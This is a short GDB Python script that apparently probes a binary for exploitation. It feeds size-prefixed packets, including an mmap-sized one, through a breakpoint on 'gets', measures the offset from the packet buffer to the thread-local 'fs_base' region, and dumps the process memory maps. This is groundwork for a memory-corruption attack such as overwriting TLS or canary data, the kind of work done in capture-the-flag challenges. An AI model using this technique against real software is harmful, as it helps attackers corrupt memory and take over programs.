import gdb, struct
p64 = lambda x: struct.pack("<Q", x)

OPS = [
    (0x10, b"\x00"*8),
    (0x30001, b"\x00"*8),
    (0x30001, b"\x00"*8),
]

def build(ops):
    out = b""
    for size, payload in ops:
        out += struct.pack("<Q", size) + payload + b"\n"
    return out

open("./_z_441/input.bin", "wb").write(build(OPS))

class GetsBP(gdb.Breakpoint):
    def stop(self):
        hits[0] += 1
        rdi = int(gdb.parse_and_eval("$rdi"))
        pkt = rdi - 8
        gdb.write("GETS#%d pkt=%#x\n" % (hits[0], pkt))
        if hits[0] == 1:
            fs = int(gdb.parse_and_eval("$fs_base"))
            gdb.write("  fs_base=%#x  delta(fs-pkt)=%#x\n" % (fs, fs - pkt))
        return hits[0] >= len(OPS)

hits = [0]
GetsBP("gets")
try:
    gdb.execute("run < ./_z_441/input.bin")
except gdb.error as e:
    gdb.write("run ended: %s\n" % e)
gdb.write("\n==== MAPS ====\n")
gdb.write(gdb.execute("info proc mappings", to_string=True))
fs = int(gdb.parse_and_eval("$fs_base"))
gdb.write("fs_base=%#x\n" % fs)
gdb.write("\n---- fs_base-0x100 region ----\n")
gdb.write(gdb.execute("x/32gx %#x" % (fs - 0x100), to_string=True))
